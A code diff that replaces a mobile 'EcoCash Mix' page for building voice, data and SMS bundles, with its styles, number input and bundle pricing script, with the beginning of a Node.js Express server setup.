@@ -1,809 +1,273 @@
-<!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
-<meta name="theme-color" content="#005F8E"/>
-<title>EcoCash Mix</title>
-<link rel="icon" href="assets/econet.png">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,300;9..40,400;9..40,500;9..40,600;9..40,700&family=DM+Mono:wght@400;500;600&display=swap" rel="stylesheet">
-<style>
-/* ── Reset ── */
-*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-/* CRITICAL: inputs must allow text interaction */
-input{-webkit-user-select:text!important;user-select:text!important;touch-action:manipulation}
-button{-webkit-user-select:none;user-select:none;touch-action:manipulation}
-
-:root{
-  --blue:#005F8E;--blue2:#004470;--blue3:#003558;
-  --cyan:#00C2FF;
-  --bg:#F2F6FA;--card:#FFFFFF;--line:rgba(0,0,0,.08);
-  --t1:#0A1628;--t2:#2D3F55;--t3:#5C7088;--t4:#9BAABB;
-  --vc:#E8335A;--sc:#7C3AED;--dc:#0284C7;
-  --ok:#10B981;--ok-dim:rgba(16,185,129,.1);
-  --err:#EF4444;--err-dim:rgba(239,68,68,.08);
-  --warn:#F59E0B;
-  --f:'DM Sans',system-ui,sans-serif;
-  --fm:'DM Mono',monospace;
-  --rp:999px;--r12:12px;--r16:16px;--r20:20px;
-  --sp:cubic-bezier(.34,1.56,.64,1);
-  --ease:cubic-bezier(.2,0,0,1);
-  /* Android status bar height fallback */
-  --status-bar:24px;
-}
-html,body{
-  width:100%;
-  /* Use min-height not fixed height so content is not clipped */
-  min-height:100dvh;
-  font-family:var(--f);
-  background:var(--bg);
-  color:var(--t1);
-  -webkit-font-smoothing:antialiased;
-  /* Allow scrolling if content overflows on small screens */
-  overflow-x:hidden;
-  overflow-y:auto;
-}
-
-/* ── Curtain ── */
-.curtain{position:fixed;inset:0;z-index:9999;pointer-events:none;background:var(--blue);opacity:0;transition:opacity .25s;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:24px}
-.curtain.show{opacity:1;pointer-events:auto}
-.c-logo{display:flex;align-items:center;gap:10px;padding:8px 20px;border-radius:var(--rp);background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.15)}
-.c-logo img{height:16px;object-fit:contain;filter:brightness(0)invert(1)}
-.c-logo-sep{width:1px;height:12px;background:rgba(255,255,255,.3)}
-.c-spinner{width:36px;height:36px;border:3px solid rgba(255,255,255,.15);border-top-color:var(--cyan);border-radius:50%;animation:spin .8s linear infinite}
-@keyframes spin{to{transform:rotate(360deg)}}
-.c-lbl{font-size:15px;font-weight:600;color:#fff;text-align:center;margin-bottom:3px}
-.c-sub{font-size:12px;color:rgba(255,255,255,.5);text-align:center}
-
-/* ── App — scrollable column, NOT fixed height ── */
-@keyframes pgIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
-.app{
-  display:flex;
-  flex-direction:column;
-  width:100%;
-  min-height:100dvh;
-  animation:pgIn .25s var(--ease) both;
-}
-
-/* ── Top bar — fixed to top, status-bar aware ── */
-.topbar{
-  /* Fixed so it always shows above system status bar */
-  position:sticky;
-  top:0;
-  z-index:100;
-  background:linear-gradient(180deg,var(--blue3),var(--blue));
-  /* pad-top: status bar height + visual padding */
-  padding-top:calc(var(--status-bar) + env(safe-area-inset-top, 0px) + 10px);
-  padding-bottom:14px;
-  padding-left:20px;
-  padding-right:20px;
-  display:flex;align-items:center;justify-content:space-between;
-}
-.topbar-brand{display:flex;align-items:center;gap:10px}
-.topbar-brand img{height:16px;object-fit:contain;filter:brightness(0)invert(1)}
-.topbar-sep{width:1px;height:13px;background:rgba(255,255,255,.25)}
-.live-badge{display:flex;align-items:center;gap:5px;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.15);border-radius:var(--rp);padding:5px 11px;font-size:11px;font-weight:600;color:rgba(255,255,255,.8)}
-.live-dot{width:5px;height:5px;border-radius:50%;background:#4ADE80;animation:liveblink 2s ease-in-out infinite}
-@keyframes liveblink{0%,100%{opacity:.3}50%{opacity:1}}
-
-/* ── Heading ── */
-.heading{background:var(--bg);padding:12px 20px 6px;display:flex;align-items:center;justify-content:space-between;gap:12px}
-.heading h2{font-size:20px;font-weight:700;color:var(--t1);letter-spacing:-.3px;line-height:1.2}
-.heading h2 span{color:var(--blue)}
-.heading p{font-size:12px;color:var(--t3);margin-top:2px}
-.heading-pill{background:var(--blue);border-radius:12px;padding:7px 14px;text-align:right;box-shadow:0 3px 12px rgba(0,95,142,.28);flex-shrink:0}
-.heading-pill-lbl{font-size:9px;font-weight:700;color:rgba(255,255,255,.5);text-transform:uppercase;letter-spacing:.6px}
-.heading-pill-val{font-family:var(--fm);font-size:18px;font-weight:700;color:#fff;line-height:1.1;letter-spacing:-.02em}
-
-/* ── Circle zone — fixed height, never flex:1 ── */
-.circle-zone{
-  height:clamp(220px,38vh,320px);
-  display:flex;align-items:center;justify-content:center;
-  position:relative;background:var(--bg);
-  flex-shrink:0;
-}
-.circle-zone::before{content:'';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:60vw;max-width:300px;aspect-ratio:1;border-radius:50%;background:radial-gradient(circle,rgba(0,95,142,.09),transparent 70%);pointer-events:none}
-.circle-wrap{position:relative;display:flex;align-items:center;justify-content:center;width:clamp(200px,60vw,280px);height:clamp(200px,60vw,280px)}
-.circle{
-  width:clamp(150px,48vw,210px);height:clamp(150px,48vw,210px);
-  border-radius:50%;
-  background:linear-gradient(145deg,var(--blue),var(--blue2) 55%,var(--blue3));
-  box-shadow:0 0 0 1.5px rgba(0,194,255,.3),0 0 0 8px rgba(0,95,142,.06),0 16px 48px rgba(0,95,142,.32),inset 0 1px 0 rgba(255,255,255,.14);
-  display:flex;flex-direction:column;align-items:center;justify-content:center;
-  position:relative;z-index:2;overflow:hidden;flex-shrink:0;
-}
-.circle::before{content:'';position:absolute;top:0;left:0;right:0;height:48%;border-radius:50% 50% 0 0;background:linear-gradient(to bottom,rgba(255,255,255,.1),transparent);pointer-events:none}
-.circle.pop{animation:cPop .3s var(--sp)}
-@keyframes cPop{0%{transform:scale(1)}40%{transform:scale(.93)}70%{transform:scale(1.04)}100%{transform:scale(1)}}
-.ring{position:absolute;inset:0;margin:auto;border-radius:50%;pointer-events:none}
-.ring-1{width:clamp(174px,55vw,242px);height:clamp(174px,55vw,242px);border:1.5px dashed rgba(0,95,142,.14);animation:rot 14s linear infinite}
-.ring-1::after{content:'';position:absolute;top:50%;left:-5px;width:9px;height:9px;border-radius:50%;background:var(--cyan);box-shadow:0 0 8px rgba(0,194,255,.8);transform:translateY(-50%)}
-.ring-2{width:clamp(188px,60vw,260px);height:clamp(188px,60vw,260px);border:1px solid rgba(0,194,255,.06);animation:rot 28s linear infinite reverse}
-@keyframes rot{to{transform:rotate(360deg)}}
-.c-price-wrap{display:flex;align-items:flex-start;gap:2px;margin-bottom:2px}
-.c-cur{font-family:var(--fm);font-size:clamp(10px,2.5vw,14px);color:rgba(255,255,255,.38);margin-top:clamp(3px,1vw,7px)}
-.c-price{font-family:var(--fm);font-size:clamp(32px,8.5vw,48px);font-weight:700;color:#fff;line-height:1;letter-spacing:-.04em;font-feature-settings:"tnum"}
-.c-plan{font-size:clamp(8px,1.8vw,10px);font-weight:600;color:rgba(255,255,255,.38);letter-spacing:.6px;text-transform:uppercase;margin-bottom:clamp(3px,1vw,7px)}
-.c-divider{width:clamp(36px,10vw,56px);height:1px;background:rgba(255,255,255,.1);margin-bottom:clamp(3px,1vw,7px)}
-.c-svcs{display:flex;flex-direction:column;align-items:center;gap:2px}
-.c-svc{display:flex;align-items:center;gap:4px;font-size:clamp(9px,2vw,11px);font-weight:500;color:rgba(255,255,255,.55)}
-.c-dot{width:4px;height:4px;border-radius:50%;flex-shrink:0}
-.c-svc-val{font-family:var(--fm);font-size:clamp(9px,2vw,11px);color:#fff;min-width:clamp(34px,8vw,46px);text-align:right;font-feature-settings:"tnum"}
-
-/* ── Pods ── */
-.pods{position:absolute;inset:0;pointer-events:none;z-index:3}
-.pod{position:absolute;display:flex;flex-direction:column;align-items:center;gap:3px;pointer-events:auto}
-.pod-lbl{font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.8px;color:var(--t3)}
-.pod-pill{display:flex;align-items:center;background:var(--card);border-radius:var(--rp);border:1px solid var(--line);box-shadow:0 3px 12px rgba(0,0,0,.1);overflow:hidden}
-.pod-btn{width:34px;height:34px;border:none;background:transparent;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:background .1s;outline:none;flex-shrink:0;touch-action:manipulation}
-.pod-btn:active{background:rgba(0,0,0,.07)}
-.pod-btn svg{display:block;pointer-events:none}
-.pod-val{min-width:44px;display:flex;flex-direction:column;align-items:center;padding:3px 4px;border-left:1px solid var(--line);border-right:1px solid var(--line)}
-.pod-num{font-family:var(--fm);font-size:clamp(12px,3vw,15px);font-weight:700;color:var(--blue);line-height:1.2;font-feature-settings:"tnum"}
-.pod-num.pop{animation:numPop .2s var(--sp)}
-@keyframes numPop{0%{transform:scale(1)}45%{transform:scale(1.2)}100%{transform:scale(1)}}
-.pod-unit{font-size:8px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--t4);margin-top:1px}
-
-/* ── Presets ── */
-.presets{padding:5px 16px 4px;background:var(--bg)}
-.presets-lbl{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.8px;color:var(--t4);margin-bottom:6px}
-.presets-row{display:flex;gap:6px;overflow-x:auto;scrollbar-width:none;padding-bottom:2px}
-.presets-row::-webkit-scrollbar{display:none}
-.chip{flex-shrink:0;display:flex;align-items:center;gap:4px;padding:7px 13px;border-radius:var(--rp);background:var(--card);border:1.5px solid var(--line);font-size:11px;font-weight:600;color:var(--t2);cursor:pointer;white-space:nowrap;box-shadow:0 1px 3px rgba(0,0,0,.07);transition:all .15s;outline:none;touch-action:manipulation}
-.chip:active{transform:scale(.93)}
-.chip svg{display:block;stroke:currentColor;fill:none;flex-shrink:0}
-.chip.active{background:var(--blue);border-color:var(--blue);color:#fff;box-shadow:0 4px 12px rgba(0,95,142,.3)}
-
-/* ── Plan tabs ── */
-.plan-zone{padding:3px 16px 5px;background:var(--bg)}
-.plan-lbl{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.8px;color:var(--t4);margin-bottom:5px}
-.plan-tabs{display:flex;background:rgba(0,0,0,.06);border-radius:var(--rp);padding:3px;gap:2px}
-.plan-tab{flex:1;display:flex;flex-direction:column;align-items:center;padding:7px 2px;border-radius:var(--rp);border:none;background:transparent;cursor:pointer;outline:none;transition:background .18s;position:relative;touch-action:manipulation}
-.plan-tab-name{font-size:11px;font-weight:500;color:var(--t3);white-space:nowrap;transition:color .18s}
-.plan-tab-price{font-family:var(--fm);font-size:9px;color:var(--t4);margin-top:2px;font-feature-settings:"tnum";transition:color .18s}
-.plan-tab.active{background:var(--card);box-shadow:0 1px 3px rgba(0,0,0,.1)}
-.plan-tab.active .plan-tab-name{color:var(--blue);font-weight:700}
-.plan-tab.active .plan-tab-price{color:var(--blue);opacity:.7}
-.plan-star{position:absolute;top:-3px;right:0;width:11px;height:11px;border-radius:50%;background:var(--warn);border:2px solid var(--bg);display:flex;align-items:center;justify-content:center}
-.plan-star svg{fill:#fff;width:5px;height:5px}
-
-/* ── Bottom sheet — natural height, no overflow clip ── */
-.sheet{background:var(--card);border-radius:20px 20px 0 0;box-shadow:0 -4px 24px rgba(0,0,0,.1);padding-bottom:max(16px,env(safe-area-inset-bottom))}
-.sheet-handle{width:36px;height:4px;background:rgba(0,0,0,.12);border-radius:2px;margin:10px auto 14px}
-
-/* Recents */
-.recents{padding:0 16px 10px;display:none}
-.recents.show{display:block}
-.recents-lbl{font-size:10px;font-weight:700;color:var(--t4);text-transform:uppercase;letter-spacing:.8px;margin-bottom:7px}
-.recents-row{display:flex;gap:7px;overflow-x:auto;scrollbar-width:none}
-.recents-row::-webkit-scrollbar{display:none}
-.recent-chip{flex-shrink:0;display:flex;align-items:center;gap:7px;padding:6px 11px 6px 7px;background:var(--bg);border:1.5px solid var(--line);border-radius:var(--rp);cursor:pointer;touch-action:manipulation}
-.recent-chip:active{background:#dce8f5;border-color:var(--blue)}
-.recent-chip-icon{width:24px;height:24px;border-radius:50%;background:linear-gradient(135deg,var(--blue),var(--blue2));display:flex;align-items:center;justify-content:center;flex-shrink:0}
-.recent-chip-icon svg{width:12px;height:12px;stroke:#fff;fill:none;stroke-width:2;stroke-linecap:round}
-.recent-chip-num{font-family:var(--fm);font-size:12px;font-weight:700;color:var(--t1)}
-
-/* Number input */
-.num-section{padding:0 16px}
-.num-lbl{font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.4px;margin-bottom:8px}
-.num-card{border:2px solid var(--line);border-radius:var(--r16);background:var(--bg);overflow:hidden;margin-bottom:6px;transition:border-color .2s,box-shadow .2s}
-.num-card.focused{border-color:var(--blue);box-shadow:0 0 0 3px rgba(0,95,142,.1)}
-.num-card.valid{border-color:var(--ok);box-shadow:0 0 0 3px var(--ok-dim)}
-.num-card.error{border-color:var(--err);box-shadow:0 0 0 3px var(--err-dim)}
-.num-row{display:flex;align-items:center;padding-left:14px}
-.num-prefix{display:flex;align-items:center;gap:6px;padding-right:12px;border-right:2px solid var(--line);flex-shrink:0;margin-right:12px}
-.num-flag{font-size:17px;line-height:1}
-.num-code{font-family:var(--fm);font-size:14px;font-weight:700;color:var(--t2)}
-#numInput{
-  /* EXPLICIT — not inherited from any rule */
-  display:block;
-  flex:1;
-  min-width:0;
-  width:100%;
-  border:none;
-  outline:none;
-  background:transparent;
-  font-family:var(--fm);
-  font-size:20px;
-  font-weight:700;
-  color:var(--t1);
-  letter-spacing:.4px;
-  padding:14px 0;
-  /* iOS/Android text interaction */
-  -webkit-user-select:text!important;
-  user-select:text!important;
-  touch-action:manipulation;
-  /* Prevent iOS zoom on focus (font-size already ≥16px) */
-  font-size:max(16px, 20px);
-}
-#numInput::placeholder{color:var(--t4);font-weight:400;font-size:16px;letter-spacing:0}
-.num-clear{display:none;width:38px;height:38px;border:none;background:transparent;cursor:pointer;align-items:center;justify-content:center;flex-shrink:0;margin-right:6px;border-radius:50%;touch-action:manipulation}
-.num-clear.show{display:flex}
-.num-clear:active{background:rgba(0,0,0,.06)}
-.num-clear svg{width:15px;height:15px;stroke:var(--t4);fill:none;stroke-width:2;stroke-linecap:round}
-
-/* Network tag */
-.net-tag{display:flex;align-items:center;gap:6px;padding:7px 14px;border-top:1px solid var(--line);font-size:11px;font-weight:600;color:var(--t4);background:transparent;transition:all .2s}
-.net-tag.ok{color:var(--ok);background:var(--ok-dim)}
-.net-tag.err{color:var(--err);background:var(--err-dim)}
-.net-tag svg{width:12px;height:12px;stroke:currentColor;fill:none;stroke-width:2.5;stroke-linecap:round;flex-shrink:0}
-
-/* Verify status */
-.ver-row{display:none;align-items:center;gap:8px;padding:8px 14px;border-top:1px solid var(--line)}
-.ver-row.show{display:flex}
-.ver-spin{width:14px;height:14px;border:2px solid rgba(0,95,142,.2);border-top-color:var(--blue);border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0}
-.ver-ok{display:none;align-items:center;gap:6px;font-size:12px;font-weight:700;color:var(--ok)}
-.ver-ok.show{display:flex}
-.ver-ok-icon{width:18px;height:18px;border-radius:50%;background:var(--ok);display:flex;align-items:center;justify-content:center;flex-shrink:0}
-.ver-ok-icon svg{width:10px;height:10px;stroke:#fff;fill:none;stroke-width:3;stroke-linecap:round}
-.ver-txt{font-size:12px;font-weight:600;color:var(--blue);display:none}
-.ver-txt.show{display:block}
-
-.err-txt{font-size:12px;color:var(--err);padding:0 2px;margin-bottom:4px;display:none}
-.err-txt.show{display:block}
-
-/* Pay button */
-.pay-wrap{padding:8px 16px 0}
-.pay-btn{
-  width:100%;min-height:54px;padding:13px 18px;
-  border:none;border-radius:var(--r16);cursor:pointer;
-  background:linear-gradient(135deg,var(--blue),var(--blue2));
-  display:flex;align-items:center;justify-content:space-between;
-  box-shadow:0 4px 20px rgba(0,95,142,.38);
-  transition:transform .14s var(--sp),box-shadow .18s,opacity .2s;
-  position:relative;overflow:hidden;outline:none;
-  touch-action:manipulation;
-}
-.pay-btn:active{transform:scale(.97);box-shadow:0 2px 8px rgba(0,95,142,.25)}
-.pay-btn:disabled{opacity:.5;box-shadow:none;cursor:default;transform:none}
-.pay-btn-l{display:flex;align-items:center;gap:12px;pointer-events:none}
-.pay-btn-icon{width:34px;height:34px;border-radius:10px;background:rgba(255,255,255,.15);display:flex;align-items:center;justify-content:center;flex-shrink:0}
-.pay-btn-icon svg{display:block}
-.pay-btn-title{font-size:15px;font-weight:700;color:#fff;line-height:1.2}
-.pay-btn-sub{font-size:10px;color:rgba(255,255,255,.55);margin-top:1px}
-.pay-btn-r{pointer-events:none;text-align:right}
-.pay-btn-amt-lbl{font-size:9px;font-weight:600;text-transform:uppercase;letter-spacing:.5px;color:rgba(255,255,255,.45);margin-bottom:1px}
-.pay-btn-amt{font-family:var(--fm);font-size:20px;font-weight:700;color:#fff;letter-spacing:-.02em;font-feature-settings:"tnum"}
-
-/* Ripple */
-.rip{position:absolute;border-radius:50%;pointer-events:none;background:rgba(255,255,255,.25);transform:scale(0);animation:rip .5s ease forwards}
-@keyframes rip{to{transform:scale(4);opacity:0}}
-</style>
-</head>
-<body>
-<script src="api.js"></script>
-
-<!-- Curtain -->
-<div class="curtain" id="curtain">
-  <div class="c-logo"><img src="assets/econet.png" alt=""><div class="c-logo-sep"></div><img src="assets/ecocash.png" alt=""></div>
-  <div class="c-spinner"></div>
-  <div><div class="c-lbl" id="cLbl">Loading</div><div class="c-sub" id="cSub">Preparing…</div></div>
-</div>
-
-<div class="app" id="screen">
-
-  <!-- Top bar (sticky, status-bar aware) -->
-  <div class="topbar" id="topbar">
-    <div class="topbar-brand">
-      <img src="assets/econet.png" alt="Econet">
-      <div class="topbar-sep"></div>
-      <img src="assets/ecocash.png" alt="EcoCash">
-    </div>
-    <div class="live-badge">
-      <div class="live-dot"></div>
-      <span id="liveCount">—</span>
-    </div>
-  </div>
-
-  <!-- Heading -->
-  <div class="heading">
-    <div>
-      <h2>Mix your <span>Bundle</span></h2>
-      <p>Adjust · Enter recipient · Pay</p>
-    </div>
-    <div class="heading-pill">
-      <div class="heading-pill-lbl">Total</div>
-      <div class="heading-pill-val" id="totalPill">$0.60</div>
-    </div>
-  </div>
-
-  <!-- Circle (fixed height) -->
-  <div class="circle-zone" id="circleZone">
-    <div class="circle-wrap" id="circleWrap">
-      <div class="ring ring-2"></div>
-      <div class="ring ring-1"></div>
-      <div class="circle" id="bundleCircle">
-        <div class="c-price-wrap"><span class="c-cur">USD</span><span class="c-price" id="cPrice">0.00</span></div>
-        <div class="c-plan" id="cPlan">Daily Mix</div>
-        <div class="c-divider"></div>
-        <div class="c-svcs">
-          <div class="c-svc"><div class="c-dot" style="background:var(--vc)"></div><span>Voice</span><span class="c-svc-val" id="cVoice">20 Min</span></div>
-          <div class="c-svc"><div class="c-dot" style="background:var(--dc)"></div><span>Data</span><span class="c-svc-val" id="cData">3 GB</span></div>
-          <div class="c-svc"><div class="c-dot" style="background:var(--sc)"></div><span>SMS</span><span class="c-svc-val" id="cSms">25 SMS</span></div>
-        </div>
-      </div>
-    </div>
-    <!-- Pods -->
-    <div class="pods" id="podsWrap">
-      <div class="pod" id="pod-voice">
-        <div class="pod-lbl">Voice</div>
-        <div class="pod-pill">
-          <button class="pod-btn" id="v-dec"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="var(--vc)" stroke-width="2.5" stroke-linecap="round"><line x1="5" y1="12" x2="19" y2="12"/></svg></button>
-          <div class="pod-val"><div class="pod-num" id="pV">20</div><div class="pod-unit">Min</div></div>
-          <button class="pod-btn" id="v-inc"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="var(--vc)" stroke-width="2.5" stroke-linecap="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></button>
-        </div>
-      </div>
-      <div class="pod" id="pod-data">
-        <div class="pod-lbl">Data</div>
-        <div class="pod-pill">
-          <button class="pod-btn" id="d-dec"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="var(--dc)" stroke-width="2.5" stroke-linecap="round"><line x1="5" y1="12" x2="19" y2="12"/></svg></button>
-          <div class="pod-val"><div class="pod-num" id="pD">3</div><div class="pod-unit">GB</div></div>
-          <button class="pod-btn" id="d-inc"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="var(--dc)" stroke-width="2.5" stroke-linecap="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></button>
-        </div>
-      </div>
-      <div class="pod" id="pod-sms">
-        <div class="pod-pill">
-          <button class="pod-btn" id="s-dec"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="var(--sc)" stroke-width="2.5" stroke-linecap="round"><line x1="5" y1="12" x2="19" y2="12"/></svg></button>
-          <div class="pod-val"><div class="pod-num" id="pS">25</div><div class="pod-unit">SMS</div></div>
-          <button class="pod-btn" id="s-inc"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="var(--sc)" stroke-width="2.5" stroke-linecap="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></button>
-        </div>
-        <div class="pod-lbl">SMS</div>
-      </div>
-    </div>
-  </div>
-
-  <!-- Presets -->
-  <div class="presets">
-    <div class="presets-lbl">Quick presets</div>
-    <div class="presets-row">
-      <button class="chip" data-p="student"><svg width="10" height="10" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round"><path d="M22 10v6M2 10l10-5 10 5-10 5z"/></svg>Student</button>
-      <button class="chip" data-p="social"><svg width="10" height="10" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>Social</button>
-      <button class="chip" data-p="calling"><svg width="10" height="10" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 3.07 9.81 19.79 19.79 0 0 1 .14 1.18 2 2 0 0 1 2.13 0h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L6.09 7.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 14.92z"/></svg>Calling</button>
-      <button class="chip" data-p="streaming"><svg width="10" height="10" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>Streaming</button>
-      <button class="chip" data-p="business"><svg width="10" height="10" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/></svg>Business</button>
-      <button class="chip" data-p="weekend"><svg width="10" height="10" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2"/></svg>Weekend</button>
-    </div>
-  </div>
-
-  <!-- Plan tabs -->
-  <div class="plan-zone">
-    <div class="plan-lbl">Validity</div>
-    <div class="plan-tabs" role="tablist">
-      <button class="plan-tab active" data-key="daily" role="tab"><span class="plan-tab-name">Daily</span><span class="plan-tab-price" id="pp-daily">$0.60</span></button>
-      <button class="plan-tab" data-key="3days" role="tab"><span class="plan-tab-name">3 Days</span><span class="plan-tab-price" id="pp-3days">$1.40</span></button>
-      <button class="plan-tab" data-key="weekly" role="tab"><span class="plan-tab-name">Weekly</span><span class="plan-tab-price" id="pp-weekly">$2.80</span></button>
-      <button class="plan-tab" data-key="2weeks" role="tab"><span class="plan-tab-name">2 Wks</span><span class="plan-tab-price" id="pp-2weeks">$5.20</span></button>
-      <button class="plan-tab" data-key="monthly" role="tab"><span class="plan-tab-name">Monthly</span><span class="plan-tab-price" id="pp-monthly">$9.90</span><div class="plan-star"><svg viewBox="0 0 24 24"><polygon points="12,2 15.09,8.26 22,9.27 17,14.14 18.18,21.02 12,17.77 5.82,21.02 7,14.14 2,9.27 8.91,8.26"/></svg></div></button>
-    </div>
-  </div>
-
-  <!-- Bottom sheet (natural height, scrolls with page) -->
-  <div class="sheet">
-    <div class="sheet-handle"></div>
-
-    <!-- Recents -->
-    <div class="recents" id="recentsWrap">
-      <div class="recents-lbl">Recent</div>
-      <div class="recents-row" id="recentsList"></div>
-    </div>
-
-    <!-- Number input -->
-    <div class="num-section">
-      <div class="num-lbl">Who is this for?</div>
-      <div class="num-card" id="numCard">
-        <div class="num-row">
-          <div class="num-prefix">
-            <span class="num-flag">🇿🇼</span>
-            <span class="num-code">+263</span>
-          </div>
-          <input id="numInput" type="tel" inputmode="numeric"
-            placeholder="7XXXXXXXX"
-            autocomplete="tel" maxlength="13">
-          <button class="num-clear" id="numClear">
-            <svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
-          </button>
-        </div>
-        <div class="net-tag" id="netTag">
-          <svg viewBox="0 0 24 24"><path d="M1.5 8.5A14 14 0 0 1 12 5a14 14 0 0 1 10.5 3.5"/><path d="M5 12a10 10 0 0 1 7-3 10 10 0 0 1 7 3"/><path d="M8.5 15.5A6 6 0 0 1 12 14a6 6 0 0 1 3.5 1.5"/><circle cx="12" cy="19" r="1" fill="currentColor"/></svg>
-          <span id="netLbl">Enter an Econet number (077, 078, 073, 071)</span>
-        </div>
-        <div class="ver-row" id="verRow">
-          <div class="ver-spin" id="verSpin"></div>
-          <div class="ver-ok" id="verOk">
-            <div class="ver-ok-icon"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div>
-            <span>Econet number verified</span>
-          </div>
-          <span class="ver-txt" id="verTxt">Verifying…</span>
-        </div>
-      </div>
-      <div class="err-txt" id="errTxt"></div>
-    </div>
-
-    <!-- Pay button -->
-    <div class="pay-wrap">
-      <button class="pay-btn" id="payBtn" disabled>
-        <div class="pay-btn-l">
-          <div class="pay-btn-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg></div>
-          <div>
-            <div class="pay-btn-title" id="payTitle">Verify number to continue</div>
-            <div class="pay-btn-sub" id="paySub">EcoCash · Instant · Secure</div>
-          </div>
-        </div>
-        <div class="pay-btn-r">
-          <div class="pay-btn-amt-lbl">Total</div>
-          <div class="pay-btn-amt" id="payAmt">$0.60</div>
-        </div>
-      </button>
-    </div>
-  </div>
-
-</div>
-
-<script>
 'use strict';
+const express   = require('express');
+const path      = require('path');
+const https     = require('https');
+const rateLimit = require('express-rate-limit');
 
-/* ── Haptic ── */
-function haptic(s){if(!navigator.vibrate)return;const m={light:8,med:18,ok:[10,50,10],err:[40,30,40]};try{navigator.vibrate(m[s]||10)}catch(e){}}
+const app  = express();
+const PORT = process.env.PORT || 3000;
 
-/* ── Detect status bar height and adjust topbar ── */
-(function(){
-  // On Android WebViews the status bar height is exposed via window.screen
-  // or via the visual viewport. We detect it and patch --status-bar.
-  function setStatusBar(){
-    var h=0;
-    if(window.screen&&window.screen.availTop>0)h=window.screen.availTop;
-    else if(window.visualViewport&&window.visualViewport.offsetTop>0)h=window.visualViewport.offsetTop;
-    if(h>0){document.documentElement.style.setProperty('--status-bar',h+'px');}
-  }
-  setStatusBar();
-  window.addEventListener('resize',setStatusBar,{passive:true});
-})();
+app.set('trust proxy', 1);
+app.use(express.json({ limit: '20kb' }));
+app.use(express.urlencoded({ extended: false }));
 
-/* ── Bundle engine ── */
-const PLANS={
-  daily:   {label:'Daily',   maxV:20,  maxS:25,   maxD:3,   price:0.60,steps:{v:5, s:5, d:1}},
-  '3days': {label:'3 Days',  maxV:50,  maxS:75,   maxD:8,   price:1.40,steps:{v:10,s:25,d:2}},
-  weekly:  {label:'Weekly',  maxV:120, maxS:200,  maxD:20,  price:2.80,steps:{v:20,s:50,d:5}},
-  '2weeks':{label:'2 Weeks', maxV:250, maxS:450,  maxD:45,  price:5.20,steps:{v:50,s:50,d:5}},
-  monthly: {label:'Monthly', maxV:600, maxS:1000, maxD:100, price:9.90,steps:{v:50,s:100,d:10}},
-};
-const ST={};
-Object.keys(PLANS).forEach(function(k){var p=PLANS[k];ST[k]={v:p.maxV,s:p.maxS,d:p.maxD};});
-var activeKey='daily';
-var PRESETS={
-  student:{vP:.25,sP:.5,dP:.75},social:{vP:.25,sP:.75,dP:.75},
-  calling:{vP:1,sP:.25,dP:.25},streaming:{vP:.25,sP:.25,dP:1},
-  business:{vP:.75,sP:.75,dP:.5},weekend:{vP:.5,sP:.5,dP:1}
-};
-var activePreset=null;
-
-function calcPrice(k){
-  var p=PLANS[k],s=ST[k];
-  return Math.round(((s.v/p.maxV+s.s/p.maxS+s.d/p.maxD)/3)*p.price*100)/100;
-}
-
-var _prev=0;
-function animPrice(to){
